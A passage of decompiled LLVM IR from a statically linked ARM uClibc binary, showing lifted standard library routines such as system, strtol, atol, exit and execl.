  %v1_156d0 = load i32, i32* @r6, align 4
  %v3_156d0 = sub i32 %v4_156cc, %v1_156d0
  %v4_156d4 = sdiv i32 %v3_156d0, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_156dc = mul i32 %v4_156d4, 5
  %v5_156dc = add i32 %v4_156dc, %v0_156c8
  store i32 %v5_156dc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_156e4 = load i32, i32* @r7, align 4
  %v2_156e4 = inttoptr i32 %v1_156e4 to i32*
  store i32 0, i32* %v2_156e4, align 4
  %v1_156ec = load i32, i32* %r3.global-to-local, align 4
  %v2_156ec = load i32, i32* @r7, align 4
  %v3_156ec = inttoptr i32 %v2_156ec to i32*
  store i32 %v1_156ec, i32* %v3_156ec, align 4
  %v17_156f0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_156f0 = phi i32 [ %v1_156e8, %bb26 ], [ %v17_156f0.pre, %.thread4 ]
  %v2_156f0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_156f0, i32* %r4.global-to-local, align 4
  ret i32 %v17_156f0

dec_label_pc_156f4:                               ; preds = %dec_label_pc_15678
  %v0_156f4 = call i32 @__errno_location()
  store i32 %v0_156f4, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_156fc = inttoptr i32 %v0_156f4 to i32*
  store i32 22, i32* %v2_156fc, align 4
  %v0_15700 = call i32 @__errno_location()
  %v0_15704 = load i32, i32* %r4.global-to-local, align 4
  %v2_15704 = inttoptr i32 %v0_15700 to i32*
  store i32 %v0_15704, i32* %v2_15704, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1570c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1570c, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_15688, { 1, 0 }
  uselistorder i1 %v7_15660, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 (i32*, i32)* @srandom_r, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_20b70.1182 to i32), i32 20), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_20b70.1182 to i32), { 2, 3, 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15714 = load i32, i32* @r4, align 4
  %v0_15718 = load i32, i32* %r0.global-to-local, align 4
  %v2_15718 = icmp eq i32 %v0_15718, 0
  br i1 %v2_15718, label %bb, label %dec_label_pc_1572c

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15838

dec_label_pc_1572c:                               ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_15734 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_15744 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_15754 = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_15754, i32* %r0.global-to-local, align 4
  %v0_1575c = call i32 @__vfork()
  store i32 %v0_1575c, i32* %r0.global-to-local, align 4
  store i32 %v0_1575c, i32* @r4, align 4
  %v1_15760 = icmp slt i32 %v0_1575c, 0
  br i1 %v1_15760, label %dec_label_pc_15768, label %dec_label_pc_15794

dec_label_pc_15768:                               ; preds = %dec_label_pc_1572c
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_15770 = call i32 @__bsd_signal(i32 3, i32 %v2_15734)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1577c = call i32 @__bsd_signal(i32 2, i32 %v2_15744)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_15788 = call i32 @__bsd_signal(i32 17, i32 %v2_15754)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15838

dec_label_pc_15794:                               ; preds = %dec_label_pc_1572c
  %v2_15760 = icmp eq i32 %v0_1575c, 0
  br i1 %v2_15760, label %dec_label_pc_15798, label %dec_label_pc_157dc

dec_label_pc_15798:                               ; preds = %dec_label_pc_15794
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_157a0 = call i32 @__bsd_signal(i32 3, i32 0)
  %v0_157a4 = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_157ac = call i32 @__bsd_signal(i32 2, i32 %v0_157a4)
  %v0_157b0 = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_157b8 = call i32 @__bsd_signal(i32 17, i32 %v0_157b0)
  store i32 ptrtoint ([8 x i8]* @global_var_20b98.1190 to i32), i32* @r0, align 4
  %v0_157cc = load i32, i32* @r4, align 4
  %v8_157d0 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_20b98.1190 to i32), i32 ptrtoint ([3 x i8]* @global_var_20ba0.1192 to i32), i32 ptrtoint ([3 x i8]* @global_var_20ba4.1194 to i32), i32 %v0_15718, i32 %v0_157cc)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_157d8 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_157dc:                               ; preds = %dec_label_pc_15794
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_157e4 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_157f0 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_15800 = load i32, i32* @r4, align 4
  store i32 %v0_15800, i32* %r0.global-to-local, align 4
  %v0_15804 = call i32 @wait4()
  store i32 %v0_15804, i32* %r0.global-to-local, align 4
  %v7_15808 = icmp eq i32 %v0_15804, -1
  br i1 %v7_15808, label %bb10, label %bb11

bb10:                                             ; preds = %dec_label_pc_157dc
  store i32 %v0_15804, i32* %stack_var_-12, align 4
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_157dc, %bb10
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_15818 = call i32 @__bsd_signal(i32 3, i32 %v2_15734)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_15824 = call i32 @__bsd_signal(i32 2, i32 %v2_15744)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_15830 = call i32 @__bsd_signal(i32 17, i32 %v2_15754)
  %v3_15834 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_15834, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15838

dec_label_pc_15838:                               ; preds = %bb, %dec_label_pc_15768, %bb11
  %v8_1583c = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_15768 ], [ %v3_15834, %bb11 ]
  store i32 %v3_15714, i32* @r4, align 4
  ret i32 %v8_1583c

; uselistorder directives
  uselistorder i32 %v0_15804, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 20, 19, 21, 22, 23, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_15838, { 2, 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_15854 = call i32 @strtol()
  ret i32 %v0_15854
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_1585c = call i32 @_stdlib_strto_l()
  ret i32 %v0_1585c
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15860 = load i32, i32* @r4, align 4
  store i32 %v3_15860, i32* %stack_var_-36, align 4
  %v0_15864 = load i32, i32* @r1, align 4
  store i32 %v0_15864, i32* %sb.global-to-local, align 4
  %v0_15868 = load i32, i32* @r2, align 4
  store i32 %v0_15868, i32* %r5.global-to-local, align 4
  %v0_1586c = load i32, i32* @r3, align 4
  store i32 %v0_1586c, i32* %fp.global-to-local, align 4
  %v0_15870 = load i32, i32* @r0, align 4
  %v2_15884.pre = load i32, i32* @global_var_29594, align 4
  br label %dec_label_pc_1587c

dec_label_pc_1587c:                               ; preds = %dec_label_pc_1587c, %entry
  %v0_158b4 = phi i32 [ %v0_15870, %entry ], [ %v1_15878, %dec_label_pc_1587c ]
  store i32 %v0_158b4, i32* %r4.global-to-local, align 4
  %v1_15880 = inttoptr i32 %v0_158b4 to i8*
  %v2_15880 = load i8, i8* %v1_15880, align 1
  %v3_15880 = zext i8 %v2_15880 to i32
  %v3_15888 = mul nuw nsw i32 %v3_15880, 2
  %v4_15888 = add i32 %v3_15888, %v2_15884.pre
  %v5_15888 = inttoptr i32 %v4_15888 to i8*
  %v6_15888 = load i8, i8* %v5_15888, align 1
  %v1_1588c = and i8 %v6_15888, 32
  %v2_1588c = icmp eq i8 %v1_1588c, 0
  %v1_15878 = add i32 %v0_158b4, 1
  br i1 %v2_1588c, label %dec_label_pc_15894, label %dec_label_pc_1587c

dec_label_pc_15894:                               ; preds = %dec_label_pc_1587c
  %v7_15894 = icmp eq i8 %v2_15880, 43
  br i1 %v7_15894, label %dec_label_pc_158b4, label %dec_label_pc_1589c

dec_label_pc_1589c:                               ; preds = %dec_label_pc_15894
  %v7_1589c = icmp eq i8 %v2_15880, 45
  br i1 %v7_1589c, label %dec_label_pc_158b4, label %bb

bb:                                               ; preds = %dec_label_pc_1589c
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_158b8

dec_label_pc_158b4:                               ; preds = %dec_label_pc_15894, %dec_label_pc_1589c
  %storemerge43 = phi i32 [ 1, %dec_label_pc_1589c ], [ 0, %dec_label_pc_15894 ]
  store i32 %storemerge43, i32* %r7.global-to-local, align 4
  store i32 %v1_15878, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_158b8

dec_label_pc_158b8:                               ; preds = %bb, %dec_label_pc_158b4
  %v0_158d8 = phi i32 [ %v0_158b4, %bb ], [ %v1_15878, %dec_label_pc_158b4 ]
  %v1_158b8 = and i32 %v0_15868, -17
  %v3_158b8 = icmp eq i32 %v1_158b8, 0
  br i1 %v3_158b8, label %dec_label_pc_158c4, label %bb54

bb54:                                             ; preds = %dec_label_pc_158b8
  br label %bb58

dec_label_pc_158c4:                               ; preds = %dec_label_pc_158b8
  %v1_158c4 = inttoptr i32 %v0_158d8 to i8*
  %v2_158c4 = load i8, i8* %v1_158c4, align 1
  %v7_158c8 = icmp eq i8 %v2_158c4, 48
  %v1_158cc = add i32 %v0_15868, 10
  store i32 %v1_158cc, i32* %r5.global-to-local, align 4
  br i1 %v7_158c8, label %dec_label_pc_158d8, label %bb55

bb55:                                             ; preds = %dec_label_pc_158c4
  br label %.thread8

dec_label_pc_158d8:                               ; preds = %dec_label_pc_158c4
  %v1_158d8 = add i32 %v0_158d8, 1
  %v2_158d8 = inttoptr i32 %v1_158d8 to i8*
  %v3_158d8 = load i8, i8* %v2_158d8, align 1
  %v4_158d8 = zext i8 %v3_158d8 to i32
  store i32 %v1_158d8, i32* %r4.global-to-local, align 4
  %v1_158dc = or i32 %v4_158d8, 32
  %v7_158e0 = icmp eq i32 %v1_158dc, 120
  %v1_158e4 = add i32 %v0_15868, 8
  store i32 %v1_158e4, i32* %r5.global-to-local, align 4
  br i1 %v7_158e0, label %bb56, label %.thread8

bb56:                                             ; preds = %dec_label_pc_158d8
  %v3_158f0 = mul i32 %v1_158e4, 2
  store i32 %v3_158f0, i32* %r5.global-to-local, align 4
  %v2_158f4 = add i32 %v0_158d8, 2
  store i32 %v2_158f4, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_158d8, %bb55, %bb56
  %v1_159b828 = phi i32 [ %v0_15870, %bb55 ], [ %v1_158d8, %bb56 ], [ %v1_158d8, %dec_label_pc_158d8 ]
  %v0_1594019 = phi i32 [ %v0_158d8, %bb55 ], [ %v2_158f4, %bb56 ], [ %v1_158d8, %dec_label_pc_158d8 ]
  %v0_158f8 = phi i32 [ %v1_158cc, %bb55 ], [ %v3_158f0, %bb56 ], [ %v1_158e4, %dec_label_pc_158d8 ]
  %v5_158fc = icmp slt i32 %v0_158f8, 16
  br i1 %v5_158fc, label %bb58, label %bb57

bb57:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %bb54, %.thread8, %bb57
  %v1_159b827 = phi i32 [ %v0_15870, %bb54 ], [ %v1_159b828, %.thread8 ], [ %v1_159b828, %bb57 ]
  %v0_1594018 = phi i32 [ %v0_158d8, %bb54 ], [ %v0_1594019, %.thread8 ], [ %v0_1594019, %bb57 ]
  %v0_15910 = phi i32 [ %v0_15868, %bb54 ], [ %v0_158f8, %.thread8 ], [ 16, %bb57 ]
  %v1_15900 = add i32 %v0_15910, -2
  %tmp = icmp ugt i32 %v1_15900, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_15910

.thread:                                          ; preds = %bb58
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_159b4

dec_label_pc_15910:                               ; preds = %bb58
  %v2_15918 = urem i32 -1, %v0_15910
  %v1_15928 = urem i32 %v2_15918, 256
  store i32 %v1_15928, i32* %sl.global-to-local, align 4
  %v2_1592c = udiv i32 -1, %v0_15910
  store i32 0, i32* @ip, align 4
  store i32 %v2_1592c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15940

dec_label_pc_1593c:                               ; preds = %bb65, %dec_label_pc_1599c
  %v0_1593c = phi i32 [ %v1_1596c, %bb65 ], [ %v0_1593c.pre, %dec_label_pc_1599c ]
  br label %dec_label_pc_15940

dec_label_pc_15940:                               ; preds = %dec_label_pc_15910, %dec_label_pc_1593c
  %v1_159b825 = phi i32 [ %v1_159b827, %dec_label_pc_15910 ], [ %v0_1593c, %dec_label_pc_1593c ]
  %v0_1596c = phi i32 [ %v0_1594018, %dec_label_pc_15910 ], [ %v0_1593c, %dec_label_pc_1593c ]
  %v1_15940 = inttoptr i32 %v0_1596c to i8*
  %v2_15940 = load i8, i8* %v1_15940, align 1
  %v3_15940 = zext i8 %v2_15940 to i32
  %v1_15944 = add nsw i32 %v3_15940, -48
  %v1_15948 = urem i32 %v1_15944, 256
  %v1_15950 = or i32 %v3_15940, 32
  %tmp73 = icmp ult i32 %v1_15948, 10
  br i1 %tmp73, label %bb60, label %dec_label_pc_15958

dec_label_pc_15958:                               ; preds = %dec_label_pc_15940
  %tmp74 = icmp ugt i32 %v1_15950, 96
  br i1 %tmp74, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_15958
  %v1_1595c = add nsw i32 %v1_15950, -87
  %v5_15964 = urem i32 %v1_1595c, 256
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_15940, %dec_label_pc_15958, %bb59
  %v3_15994 = phi i32 [ %v1_15948, %dec_label_pc_15940 ], [ 40, %dec_label_pc_15958 ], [ %v5_15964, %bb59 ]
  %v1_15968 = load i32, i32* %r5.global-to-local, align 4
  %v1_1596c = add i32 %v0_1596c, 1
  store i32 %v1_1596c, i32* %r4.global-to-local, align 4
  %v6_15970 = icmp slt i32 %v3_15994, %v1_15968
  br i1 %v6_15970, label %dec_label_pc_15974, label %dec_label_pc_159b4.loopexit

dec_label_pc_15974:                               ; preds = %bb60
  %v0_15974 = load i32, i32* @ip, align 4
  %v1_15974 = load i32, i32* %r8.global-to-local, align 4
  %v9_15974 = icmp eq i32 %v0_15974, %v1_15974
  br i1 %v9_15974, label %.thread37, label %bb61

.thread37:                                        ; preds = %dec_label_pc_15974
  br label %dec_label_pc_15984

bb61:                                             ; preds = %dec_label_pc_15974
  %v3_15974 = icmp ult i32 %v0_15974, %v1_15974
  br i1 %v3_15974, label %dec_label_pc_15984, label %dec_label_pc_1599c

dec_label_pc_15984:                               ; preds = %bb61, %.thread37
  %v4_1598c2240 = phi i32 [ 1, %.thread37 ], [ 0, %bb61 ]
  %v1_15984 = load i32, i32* %sl.global-to-local, align 4
  %v3_15984 = icmp uge i32 %v3_15994, %v1_15984
  %v9_15984 = icmp eq i32 %v3_15994, %v1_15984
  %v2_15988 = xor i1 %v3_15984, true
  %v3_15988 = or i1 %v9_15984, %v2_15988
  br i1 %v3_15988, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_15984
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_15984, %bb62
  %v4_1598c = phi i32 [ %v4_1598c2240, %dec_label_pc_15984 ], [ 0, %bb62 ]
  %v2_1598c = xor i1 %v9_15984, true
  %v3_1598c = and i1 %v3_15984, %v2_1598c
  br i1 %v3_1598c, label %bb64, label %thread-pre-split

bb64:                                             ; preds = %bb63
  %v5_1598c = urem i32 %v4_1598c, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb63, %bb64
  %v0_15990 = phi i32 [ %v5_1598c, %bb64 ], [ %v4_1598c, %bb63 ]
  %v2_15990 = icmp eq i32 %v0_15990, 0
  br i1 %v2_15990, label %bb65, label %dec_label_pc_1599c

bb65:                                             ; preds = %thread-pre-split
  %v4_15994 = mul i32 %v0_15974, %v1_15968
  %v5_15994 = add i32 %v4_15994, %v3_15994
  store i32 %v5_15994, i32* @ip, align 4
  br label %dec_label_pc_1593c

dec_label_pc_1599c:                               ; preds = %bb61, %thread-pre-split
  %v0_1599c = call i32 @__errno_location()
  %v0_159a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_159a0 = load i32, i32* %fp.global-to-local, align 4
  %v2_159a0 = and i32 %v1_159a0, %v0_159a0
  store i32 %v2_159a0, i32* %r7.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v2_159ac = inttoptr i32 %v0_1599c to i32*
  store i32 34, i32* %v2_159ac, align 4
  %v0_1593c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1593c

dec_label_pc_159b4.loopexit:                      ; preds = %bb60
  %v0_159b4.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_159b4

dec_label_pc_159b4:                               ; preds = %.thread, %dec_label_pc_159b4.loopexit
  %v1_159b8 = phi i32 [ %v1_159b825, %dec_label_pc_159b4.loopexit ], [ %v1_159b827, %.thread ]
  %v2_159b8 = phi i32 [ %v0_159b4.pre, %dec_label_pc_159b4.loopexit ], [ %v0_15864, %.thread ]
  %v2_159b4 = icmp eq i32 %v2_159b8, 0
  br i1 %v2_159b4, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_159b4
  %v3_159b8 = inttoptr i32 %v2_159b8 to i32*
  store i32 %v1_159b8, i32* %v3_159b8, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_159b4, %bb66
  %v0_159bc = load i32, i32* %r7.global-to-local, align 4
  %v2_159bc = icmp eq i32 %v0_159bc, 0
  %. = select i1 %v2_159bc, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_159c8 = load i32, i32* %fp.global-to-local, align 4
  %v2_159c8 = icmp eq i32 %v0_159c8, 0
  %v0_159ec.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_159c8, label %dec_label_pc_159e4, label %bb70

bb70:                                             ; preds = %bb67
  %tmp75 = icmp ugt i32 %v0_159ec.pre.pre, %.
  br i1 %tmp75, label %dec_label_pc_159d4, label %dec_label_pc_159e4

dec_label_pc_159d4:                               ; preds = %bb70
  %v0_159d4 = call i32 @__errno_location()
  %v2_159dc = inttoptr i32 %v0_159d4 to i32*
  store i32 34, i32* %v2_159dc, align 4
  %v0_159e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_159e0, i32* @ip, align 4
  %v0_159e4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_159e4

dec_label_pc_159e4:                               ; preds = %bb70, %bb67, %dec_label_pc_159d4
  %v0_159ec.pre = phi i32 [ %v0_159ec.pre.pre, %bb70 ], [ %v0_159e0, %dec_label_pc_159d4 ], [ %v0_159ec.pre.pre, %bb67 ]
  %v0_159e4 = phi i32 [ %v0_159bc, %bb70 ], [ %v0_159e4.pre, %dec_label_pc_159d4 ], [ %v0_159bc, %bb67 ]
  %v2_159e4 = icmp eq i32 %v0_159e4, 0
  br i1 %v2_159e4, label %dec_label_pc_159e4._crit_edge, label %bb71

bb71:                                             ; preds = %dec_label_pc_159e4
  %v2_159e8 = sub i32 0, %v0_159ec.pre
  store i32 %v2_159e8, i32* @ip, align 4
  br label %dec_label_pc_159e4._crit_edge

dec_label_pc_159e4._crit_edge:                    ; preds = %dec_label_pc_159e4, %bb71
  %v0_159ec = phi i32 [ %v2_159e8, %bb71 ], [ %v0_159ec.pre, %dec_label_pc_159e4 ]
  %v2_159f0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_159f0, i32* @r4, align 4
  ret i32 %v0_159ec

; uselistorder directives
  uselistorder i32 %v0_159ec.pre, { 1, 0 }
  uselistorder i32 %v0_159ec.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_1598c, { 1, 0 }
  uselistorder i1 %v3_15984, { 1, 0 }
  uselistorder i32 %v1_15984, { 1, 0 }
  uselistorder i32 %v1_1596c, { 1, 0 }
  uselistorder i32 %v1_15950, { 1, 0 }
  uselistorder i32 %v1_15948, { 1, 0 }
  uselistorder i32 %v0_1593c, { 1, 0 }
  uselistorder i32 %v0_15910, { 1, 0, 2 }
  uselistorder i32 %v3_158f0, { 1, 0 }
  uselistorder i32 %v1_158e4, { 1, 0, 2 }
  uselistorder i32 %v0_158d8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_15878, { 1, 0, 2 }
  uselistorder i32 %v0_15870, { 1, 0, 2 }
  uselistorder i32 %v0_15868, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder label %dec_label_pc_159e4._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_159e4, { 2, 0, 1 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_159b4, { 1, 0 }
  uselistorder label %dec_label_pc_1599c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15940, { 1, 0 }
  uselistorder label %dec_label_pc_1593c, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_158b8, { 1, 0 }
  uselistorder label %dec_label_pc_158b4, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_159f8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_159f8, i32* @r0, align 4
  %v1_15a14 = call i32 @__pthread_return_void()
  %v1_15a24 = call i32 @__pthread_return_0()
  %v2_15a2c = load i32, i32* @global_var_2fb44.1202, align 4
  %v2_15a30 = icmp eq i32 %v2_15a2c, 0
  br i1 %v2_15a30, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_15a2c)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_159f8, i32* @r0, align 4
  %v1_15a50 = call i32 @__pthread_return_void()
  store i32 %v1_15a50, i32* @r0, align 4
  %v1_15a54 = call i32 @__GI___uClibc_fini(i32 %v1_15a50)
  store i32 88680, i32* @lr, align 4
  %v2_15a64 = call i32 @_stdio_term()
  %v0_15a68 = load i32, i32* @r4, align 4
  %v1_15a6c = call i32 @__GI__exit(i32 %v0_15a68)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 2, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_15a8c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_15a8c, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_15a9c = ptrtoint i32* %stack_var_-32 to i32
  %v2_15aa0 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_15aa0, i32* %stack_var_-32, align 4
  br label %dec_label_pc_15aac

dec_label_pc_15aac:                               ; preds = %dec_label_pc_15aac, %entry
  %v0_15ac0 = phi i32 [ %v1_15ac0, %dec_label_pc_15aac ], [ 0, %entry ]
  %v3_15aac = phi i32 [ %v1_15ab4, %dec_label_pc_15aac ], [ %v2_15aa0, %entry ]
  %v1_15ab0 = inttoptr i32 %v3_15aac to i32*
  %v2_15ab0 = load i32, i32* %v1_15ab0, align 4
  %v1_15ab4 = add i32 %v3_15aac, 4
  %v2_15ab8 = icmp eq i32 %v2_15ab0, 0
  store i32 %v1_15ab4, i32* %stack_var_-32, align 4
  %v1_15ac0 = add i32 %v0_15ac0, 1
  store i32 %v1_15ac0, i32* @lr, align 4
  br i1 %v2_15ab8, label %dec_label_pc_15ac8, label %dec_label_pc_15aac

dec_label_pc_15ac8:                               ; preds = %dec_label_pc_15aac
  %v3_15ac8.neg = mul i32 %v1_15ac0, -4
  %v1_15acc.neg = add i32 %v2_15a9c, -8
  %v2_15ad0 = add i32 %v1_15acc.neg, %v3_15ac8.neg
  %v2_15ad8 = inttoptr i32 %v2_15ad0 to i32*
  store i32 %arg1, i32* %v2_15ad8, align 4
  store i32 %v2_15aa0, i32* %stack_var_-32, align 4
  %v0_15ae4 = load i32, i32* @sp, align 4
  store i32 %v0_15ae4, i32* @r1, align 4
  store i32 %v0_15ae4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15aec

dec_label_pc_15aec:                               ; preds = %dec_label_pc_15aec.dec_label_pc_15aec_crit_edge, %dec_label_pc_15ac8
  %v1_15b00 = phi i32 [ %v5_15b00, %dec_label_pc_15aec.dec_label_pc_15aec_crit_edge ], [ %v0_15ae4, %dec_label_pc_15ac8 ]
  %v3_15aec = phi i32 [ %v3_15aec.pre, %dec_label_pc_15aec.dec_label_pc_15aec_crit_edge ], [ %v2_15aa0, %dec_label_pc_15ac8 ]
  %v1_15af0 = inttoptr i32 %v3_15aec to i32*
  %v2_15af0 = load i32, i32* %v1_15af0, align 4
  %v0_15af4 = load i32, i32* @lr, align 4
  %v1_15af4 = add i32 %v0_15af4, -1
  store i32 %v1_15af4, i32* @lr, align 4
  %v7_15af4 = icmp eq i32 %v0_15af4, 1
  %v1_15af8 = add i32 %v3_15aec, 4
  store i32 %v1_15af8, i32* %stack_var_-32, align 4
  %v2_15b00 = add i32 %v1_15b00, 4
  %v3_15b00 = inttoptr i32 %v2_15b00 to i32*
  store i32 %v2_15af0, i32* %v3_15b00, align 4
  %v4_15b00 = load i32, i32* %ip.global-to-local, align 4
  %v5_15b00 = add i32 %v4_15b00, 4
  store i32 %v5_15b00, i32* %ip.global-to-local, align 4
  br i1 %v7_15af4, label %dec_label_pc_15b08, label %dec_label_pc_15aec.dec_label_pc_15aec_crit_edge

dec_label_pc_15aec.dec_label_pc_15aec_crit_edge:  ; preds = %dec_label_pc_15aec
  %v3_15aec.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_15aec

dec_label_pc_15b08:                               ; preds = %dec_label_pc_15aec
  %v2_15b0c = load i32, i32* @global_var_2fb4c.1207, align 4
  store i32 %v2_15b0c, i32* @r2, align 4
  %v0_15b10 = call i32 @__GI_execve()
  ret i32 %v0_15b10

; uselistorder directives
  uselistorder i32 %v5_15b00, { 1, 0 }
  uselistorder i32 %v0_15af4, { 1, 0 }
  uselistorder i32 %v1_15ac0, { 0, 2, 1 }
  uselistorder i32 %v1_15ab4, { 1, 0 }
  uselistorder i32 %v3_15aac, { 1, 0 }
  uselistorder i32 %v2_15aa0, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
